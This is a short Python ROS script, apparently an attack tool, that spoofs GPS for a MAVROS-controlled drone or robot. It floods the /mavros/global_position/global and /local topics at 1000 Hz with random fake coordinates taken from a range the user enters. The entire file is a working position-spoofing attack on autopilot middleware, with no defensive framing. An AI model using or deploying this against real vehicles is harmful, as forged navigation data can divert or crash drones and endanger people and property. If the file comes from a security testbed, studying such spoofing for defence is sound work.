#!/usr/bin/env python3
import rospy
from sensor_msgs.msg import NavSatFix
from nav_msgs.msg import Odometry
import random
import time

global_message = NavSatFix()
local_message = Odometry()

global_publisher = rospy.Publisher('/mavros/global_position/global', NavSatFix, queue_size = 10)
local_publisher = rospy.Publisher('/mavros/global_position/local', Odometry, queue_size = 10)
rospy.init_node('gps_jamming')
rate = rospy.Rate(1000)

print("Lower Limit")
X1 = input("Please enter the latitude to be used for the spoofing: ")
Y1 = input("Please enter the longitude to be used for the spoofing: ")

print("Upper Limit")
X2 = input("Please enter the latitude to be used for the spoofing: ")
Y2 = input("Please enter the longitude to be used for the spoofing: ")

longitude = random.uniform(float(X1),float(X2))
latitude = random.uniform(float(Y1),float(Y2))

first_local = True 
first_global = True

n = 0
def jam():
    global X, Y, n, longitude, latitude

    if n == 0:
        longitude = random.uniform(float(X1),float(X2))
        latitude = random.uniform(float(Y1),float(Y2))

        # add entered position as latitute and longitude to the NavSatFix
        global_message.longitude = float(longitude)
        global_message.latitude = float(latitude)

        # add entered position to the Odometry 
        local_message.pose.pose.position.x = global_message.longitude
        local_message.pose.pose.position.y = global_message.latitude

        time.sleep(2)
    n = n + 1

    local_publisher.publish(local_message)
    global first_local
    if first_local:
        print("\nMessage with values is being spoofed to nav_msgs/Odometry")
        first_local = False

    global_publisher.publish(global_message)
    global first_global
    if first_global:
        print("\nMessage with values is being spoofed to sensor_msgs/NavSatFix")
        first_global = False

    if n == 10000:
        n = 0

try:
    while not rospy.is_shutdown():
        jam()
        rate.sleep()
except KeyboardInterrupt:
    pass
    print("\Spoofing of the GPS has stopped.")
